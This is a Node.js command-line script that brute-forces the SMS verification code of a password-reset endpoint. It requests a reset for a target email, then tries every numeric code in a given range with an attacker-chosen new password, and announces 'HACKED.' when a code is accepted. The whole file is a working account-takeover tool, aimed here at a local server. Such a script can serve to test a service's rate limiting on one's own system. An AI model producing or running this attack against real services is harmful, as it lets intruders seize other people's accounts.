const _cliProgress = require('cli-progress');
const _colors = require('colors');

const axios = require('axios');
const argv = require('optimist')
    .usage('Usage: $0 --target-email [test@mail.com] --new-password [hacked] --start [1000] --end [10000]')
    .demand([ 'target-email', 'new-password', 'start', 'end' ])
    .argv;


const progressBar = new _cliProgress.Bar({ barsize: 120 }, {
    format: _colors.green(' {bar}') + ' {percentage}% | ETA: {eta}s | {value}/{total}',
    barCompleteChar: '\u2588',
    barIncompleteChar: '\u2591'
});

const APP_URL = 'http://localhost:8081/api/v1/';

async function createAction(email) {
    const { data } = await axios.post(`${APP_URL}users/resetPasswordBySMS`, {
        data : {
            email
        }
    });

    if (!data.status) {
        console.log(data);
        if (data.error.code === 'NOT_FOUND') throw 'Email not exist';
        throw 'Create action error.';
    }

    return data;
}

async function submitAction(id, password, code) {
    const { data } = await axios.post(`${APP_URL}actions/${id}`, {
        data : {
            code,
            password,
            confirmPassword : password
        }
    });

    return data.status;
}


async function main(args) {
    const action   = await createAction(args['target-email']);
    const actionId = action.id;
    
    const barValue = args.end - args.start;
    progressBar.start(barValue, 0);

    for ( let i = args.start, k = 0; i < args.end; i++ ) {
        const result   = await submitAction(actionId, args['new-password'], i);

        if (result) {
            console.log('\nHACKED.');
            process.exit();
        }

        k++
        progressBar.update(k);
    }

    console.log("Somthing gone wrong =(");
}

main(argv).catch(e => {
    console.error(e);
});

progressBar.stop();
    